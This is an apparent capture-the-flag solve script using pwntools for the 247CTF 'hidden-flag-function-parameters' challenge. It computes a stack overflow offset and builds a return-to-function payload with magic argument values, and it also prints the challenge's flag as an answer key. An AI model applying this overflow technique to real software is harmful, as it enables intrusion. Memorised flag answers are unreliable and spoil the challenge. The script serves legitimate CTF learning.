#!/usr/bin/env python3
'''
WhatTheFuzz's submission for the 247CTF challenge hidden-flag-function-parameters.

This script can be used in the following manner:
python3 ./solve.py <REMOTE>

Args:
    param1: REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to running locally.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('./hidden_flag_function_with_args')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    # This target won't work for you, as it is different for each person each
    # session.
    if args.get('REMOTE'):
        io = remote('3125d586331210fd.247ctf.com', 50273)

    else:
        io = process([exe.path])

    return io


def get_offset():
    '''Return the offset from where our input is stored on the stack to the
    return address.
    '''

    pattern = cyclic(200)
    with process([exe.path]) as io:

        # Send the cyclic pattern.
        io.sendlineafter('You can ask for one though:', pattern)
        io.wait()

        # Open the core file.
        core = io.corefile

        # Get the faulting address.
        fault = core.fault_addr
        log.info(f'The faulting address is: {hex(fault)}')

    assert p32(fault) in pattern, 'The offset is not in the pattern.'

    # Search for the pattern to get the offset.
    offset = cyclic_find(fault)  # yields 140

    return offset


def main():
    '''Return the flag.
    '''

    offset = get_offset()
    log.info(f'The offset to the return address is: {offset}')

    with conn() as io:

        # Create the payload.
        payload = fit({
            offset:
            p32(exe.symbols['flag']),
            # Magic bytes found in the function `flag`. Check the README.
            offset + 8:  p32(0x1337),       # $ebp + 8
            offset + 12: p32(0x247),        # $ebp + 12
            offset + 16: p32(0x12345678),   # $ebp + 16
        })

        io.sendlineafter('You can ask for one though:', payload)

        # Get the flag.
        flag = io.recvline_containsS(b'247CTF{')
        assert flag == '247CTF{da70c8d41fc43fc59cf04f4e591c9ad6}', 'The flag is incorrect.'

        log.success(f'The flag is: {flag}')
        return flag


if __name__ == '__main__':
    main()
